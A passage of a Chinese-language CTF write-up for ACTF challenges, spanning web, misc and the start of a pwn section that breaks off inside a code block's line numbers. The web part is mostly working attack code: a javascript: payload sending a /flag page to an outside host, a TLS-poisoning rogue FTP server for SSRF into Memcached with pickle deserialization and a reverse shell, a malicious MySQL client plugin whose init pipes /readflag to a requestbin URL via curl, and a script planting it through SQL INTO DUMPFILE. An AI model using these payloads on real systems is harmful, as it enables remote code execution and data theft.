<h2><span id="bewhatyouwannabe">beWhatYouWannaBe</span><a href="#bewhatyouwannabe" class="header-anchor"></a></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:s=<span class="function"><span class="params">q</span>=&gt;</span><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://vps?q=&#x27;</span>+<span class="built_in">encodeURIComponent</span>(q));<span class="title function_">s</span>(<span class="string">&#x27;start&#x27;</span>);w=<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;/flag&#x27;</span>);<span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;<span class="title function_">s</span>(<span class="string">&#x27;timeout&#x27;</span>);<span class="title function_">s</span>(w.<span class="property">document</span>.<span class="property">body</span>.<span class="property">innerText</span>)&#125;,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="tolesion">ToLeSion</span><a href="#tolesion" class="header-anchor"></a></h2><p>TLS Poison 攻击通过FTPS被动模式 ssrf去打Memcached，写入session值为pickle反序列化payload。TLS 工具：<a href="https://github.com/ZeddYu/TLS-poison/">https://github.com/ZeddYu/TLS-poison/</a> ，按照 setup 做好初始化后，使用如下命令开启 rustls 的转发功能，将 TLS 上层流量转发到 2048 端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">TLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048 </span><br><span class="line">import socketserver, threading, requests, subprocess,time, base64, secrets,sys, hashlib, os</span><br><span class="line">import redis, secrets, re</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># https://github.com/jmdx/TLS-poison modified for accepting 32 bytes injections</span><br><span class="line">os.system(f&#x27;nohup /home/ubuntu/TLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048 --verbose &gt;run.log 2&gt;&amp;1 &amp;&#x27;)</span><br><span class="line"></span><br><span class="line">class MyTCPHandler(socketserver.StreamRequestHandler):</span><br><span class="line">    def handle(self):</span><br><span class="line">        print(&#x27;[+] connected&#x27;, self.request, file=sys.stderr)</span><br><span class="line">        self.request.sendall(b&#x27;220 (vsFTPd 3.0.3)\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        print(self.data, file=sys.stderr,flush=True)</span><br><span class="line">        self.request.sendall(b&#x27;230 Login successful.\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        print(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(b&#x27;227 yolo\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        print(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(b&#x27;227 yolo\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        print(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(b&#x27;257 &quot;/&quot; is the current directory\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">        if True:</span><br><span class="line">            self.data = self.rfile.readline().strip().decode()</span><br><span class="line">            print(self.data, file=sys.stderr)</span><br><span class="line">            if f&#x27;CWD &#123;secret_path&#125;&#x27; != self.data:</span><br><span class="line">                return</span><br><span class="line">            self.request.sendall(b&#x27;250 Directory successfully changed.\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">            self.data = self.rfile.readline().strip().decode()</span><br><span class="line">            print(self.data, file=sys.stderr)</span><br><span class="line">            self.request.sendall(b&#x27;250 Directory successfully changed.\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        print(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(b&#x27;227 Entering Passive Mode (127,0,0,1,43,192)\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        print(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(b&#x27;227 Entering Passive Mode (127,0,0,1,43,192)\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        print(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(b&#x27;200 Switching to Binary mode.\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        assert &#x27;SIZE refs&#x27; == self.data, self.data</span><br><span class="line">        print(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(b&#x27;213 7\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        print(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(b&#x27;150 Opening BINARY mode data connection for refs (7 bytes).\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">        print(sess.get(url, params=&#123;&#x27;url&#x27;: cmd&#125;).text)</span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        print(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(b&#x27;250 Requested file action okay, completed.&#x27;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">def ftp_worker():</span><br><span class="line">    with socketserver.TCPServer((&#x27;0.0.0.0&#x27;, 2048), MyTCPHandler) as server:</span><br><span class="line">        while True:</span><br><span class="line">            server.handle_request()</span><br><span class="line">threading.Thread(target=ftp_worker).start()</span><br></pre></td></tr></table></figure>

<p>再用写入的cookie去访问即可触发，反弹shell拿flag</p>
<h2><span id="myclient">myclient</span><a href="#myclient" class="header-anchor"></a></h2><ol>
<li>使用 MYSQLI_INIT_COMMAND 选项 + INTO DUMPFILE，写一个 evil mysql 客户端认证库到 &#x2F;tmp&#x2F;e10adc3949ba59abbe56e057f20f883e</li>
<li>使用 MYSQLI_INIT_COMMAND 选项 + INTO DUMPFILE 写入一个 Defaults 配置，其中group&#x3D;client plugin-dir&#x3D;&#x2F;tmp&#x2F;e10adc3949ba59abbe56e057f20f883e 和  default-auth&#x3D;&lt;name of library file - extension&gt;</li>
<li>使用 MYSQLI_READ_DEFAULT_FILE 选项设置为 &#x2F;tmp&#x2F;e10adc3949ba59abbe56e057f20f883e&#x2F;<writtenconfigfile> 来加载一个恶意的配置文件，该文件将触发我们的 evil.so ，然后触发 init 函数。</writtenconfigfile></li>
<li>RCE</li>
</ol>
<p>evil.c:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mysql/client_plugin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mysql.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Ubuntu x86_64:</span></span><br><span class="line"><span class="comment">apt install libmysqlclient-dev</span></span><br><span class="line"><span class="comment">gcc -shared -I /usr/include/mysql/ -o evilplugin.so evilplugin.c</span></span><br><span class="line"><span class="comment"><span class="doctag">NOTE:</span> the plugin_name MUST BE the full name with the directory traversal!!!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">evil_init</span><span class="params">(<span class="type">char</span> * a, <span class="type">size_t</span> b , <span class="type">int</span> c , va_list ds)</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/readflag | curl -XPOST http://dnsdatacheck.7twx8in3gacdrrvq.b.requestbin.net/xxd -d @-&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">evilplugin_client</span><span class="params">(MYSQL_PLUGIN_VIO *vio, MYSQL *mysql)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> res;</span><br><span class="line">  res= vio-&gt;write_packet(vio, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) mysql-&gt;passwd, <span class="built_in">strlen</span>(mysql-&gt;passwd) + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> CR_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_declare_client_plugin(AUTHENTICATION)</span><br><span class="line">  <span class="string">&quot;auth_simple&quot;</span>,  <span class="comment">/* plugin name */</span></span><br><span class="line">  <span class="string">&quot;Author Name&quot;</span>,                        <span class="comment">/* author */</span></span><br><span class="line">  <span class="string">&quot;Any-password authentication plugin&quot;</span>, <span class="comment">/* description */</span></span><br><span class="line">  &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,                              <span class="comment">/* version = 1.0.0 */</span></span><br><span class="line">  <span class="string">&quot;GPL&quot;</span>,                                <span class="comment">/* license type */</span></span><br><span class="line">  <span class="literal">NULL</span>,                                 <span class="comment">/* for internal use */</span></span><br><span class="line">  evil_init,                                 <span class="comment">/* no init function */</span></span><br><span class="line">  <span class="literal">NULL</span>,                                 <span class="comment">/* no deinit function */</span></span><br><span class="line">  <span class="literal">NULL</span>,                                 <span class="comment">/* no option-handling function */</span></span><br><span class="line">  evilplugin_client                    <span class="comment">/* main function */</span></span><br><span class="line">mysql_end_client_plugin;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genName</span>():</span><br><span class="line">    <span class="keyword">return</span> random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters)+ random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) +random.choice(string.ascii_letters)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://124.71.205.170:10047/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">shell = <span class="built_in">open</span>(<span class="string">&quot;exp.so&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">n = <span class="number">100</span></span><br><span class="line">chunks = [shell[i:i+n] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shell), n)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(chunks))</span><br><span class="line"></span><br><span class="line">prefix = genName()</span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chunks)):</span><br><span class="line">    name = <span class="string">&#x27;/tmp/e10adc3949ba59abbe56e057f20f883e/&#x27;</span> + prefix+<span class="string">&quot;_CHUNK&quot;</span>+<span class="built_in">str</span>(idx);</span><br><span class="line">    chunk = chunks[idx];</span><br><span class="line">    x = <span class="string">&quot;0x&quot;</span> +codecs.encode(chunk,<span class="string">&#x27;hex&#x27;</span>).decode()</span><br><span class="line">    <span class="keyword">if</span> idx != <span class="number">0</span> <span class="keyword">and</span> idx != <span class="built_in">len</span>(chunks)-<span class="number">1</span>:</span><br><span class="line">        previus_name = <span class="string">&#x27;/tmp/e10adc3949ba59abbe56e057f20f883e/&#x27;</span> + prefix+<span class="string">&quot;_CHUNK&quot;</span>+<span class="built_in">str</span>(idx-<span class="number">1</span>)</span><br><span class="line">        sql = <span class="string">f&quot;SELECT concat(LOAD_FILE(&#x27;<span class="subst">&#123;previus_name&#125;</span>&#x27;), <span class="subst">&#123;x&#125;</span>) INTO DUMPFILE &#x27;<span class="subst">&#123;name&#125;</span>&#x27;&quot;</span></span><br><span class="line">        r = requests.get(url,params=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;value&quot;</span>: sql&#125;)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="built_in">len</span>(chunks)-<span class="number">1</span>:</span><br><span class="line">        previus_name = <span class="string">&#x27;/tmp/e10adc3949ba59abbe56e057f20f883e/&#x27;</span> + prefix+<span class="string">&quot;_CHUNK&quot;</span>+<span class="built_in">str</span>(idx-<span class="number">1</span>)</span><br><span class="line">        sql = <span class="string">f&quot;SELECT concat(LOAD_FILE(&#x27;<span class="subst">&#123;previus_name&#125;</span>&#x27;), <span class="subst">&#123;x&#125;</span>) INTO DUMPFILE &#x27;/tmp/e10adc3949ba59abbe56e057f20f883e/auth_simple.so&#x27;&quot;</span></span><br><span class="line">        r = requests.get(url,params=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;value&quot;</span>: sql&#125;)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;w&quot;</span>).write(<span class="string">&quot;auth_simple&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;auth_simple&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sql = <span class="string">f&quot;SELECT <span class="subst">&#123;x&#125;</span> INTO DUMPFILE &#x27;<span class="subst">&#123;name&#125;</span>&#x27;&quot;</span></span><br><span class="line">        r = requests.get(url,params=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;value&quot;</span>: sql&#125;)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>



<h1><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h1><h2><span id="signin">signin</span><a href="#signin" class="header-anchor"></a></h2><p>shell脚本，和文件放一个目录解压</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!bin/bash</span><br><span class="line"></span><br><span class="line">mkdir &#x27;out&#x27;</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">    7z x flag* -o&quot;./out/&quot;</span><br><span class="line">    if [ $? = 0 ]; then</span><br><span class="line">        rm ./flag*</span><br><span class="line">        mv ./out/* ./</span><br><span class="line">    else</span><br><span class="line">        cat flag*</span><br><span class="line">        break</span><br><span class="line">    fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2><span id="mahjoong">Mahjoong</span><a href="#mahjoong" class="header-anchor"></a></h2><p>可以直接挂机得到flag，大满贯</p>
<p>或者直接看源码 webpack:&#x2F;&#x2F;majiang&#x2F;src&#x2F;js&#x2F;majiang&#x2F;util&#x2F;hule.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">240</span>,<span class="number">188</span>,<span class="number">218</span>,<span class="number">205</span>,<span class="number">188</span>,<span class="number">154</span>,<span class="number">138</span>,<span class="number">200</span>,<span class="number">207</span>,<span class="number">33</span>,<span class="number">26</span>,<span class="number">246</span>,<span class="number">30</span>,<span class="number">136</span>,<span class="number">124</span>,<span class="number">38</span>,<span class="number">241</span>,<span class="number">178</span>,<span class="number">193</span>,<span class="number">127</span>,<span class="number">163</span>,<span class="number">161</span>,<span class="number">72</span>,<span class="number">140</span>,<span class="number">187</span>,<span class="number">16</span>,<span class="number">19</span>];</span><br><span class="line"><span class="keyword">let</span> b = [<span class="number">177</span>, <span class="number">255</span>, <span class="number">142</span>, <span class="number">139</span>, <span class="number">199</span>, <span class="number">227</span>, <span class="number">202</span>, <span class="number">163</span>, <span class="number">186</span>, <span class="number">76</span>, <span class="number">91</span>, <span class="number">152</span>, <span class="number">65</span>, <span class="number">185</span>, <span class="number">15</span>, <span class="number">121</span>, <span class="number">152</span>, <span class="number">220</span>, <span class="number">162</span>, <span class="number">13</span>, <span class="number">198</span>, <span class="number">197</span>, <span class="number">36</span>, <span class="number">191</span>, <span class="number">215</span>, <span class="number">117</span>, <span class="number">110</span>];</span><br><span class="line"><span class="keyword">let</span> c = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">27</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span> ;i &lt; <span class="number">27</span>; i++)&#123;</span><br><span class="line">    c[i] = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(a[i] ^ b[i]);        </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">alert</span>(c.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>ACTF{y@kumAn_1s_incredl3le}</p>
<h2><span id="safer-telegram-bot-1">safer-telegram-bot-1</span><a href="#safer-telegram-bot-1" class="header-anchor"></a></h2><p>去 tg bot 不停地发一堆 &#x2F;login，碰个时间，蹲到哪个没 rejected，点一下 login 就能拿到 flag1 了</p>
<p>不行的话多试几次就有了，乐</p>
<h2><span id="signoff">signoff</span><a href="#signoff" class="header-anchor"></a></h2><p>填问卷</p>
<h1><span id="pwn">Pwn</span><a href="#pwn" class="header-anchor"></a></h1><h2><span id="mykvm">mykvm</span><a href="#mykvm" class="header-anchor"></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span 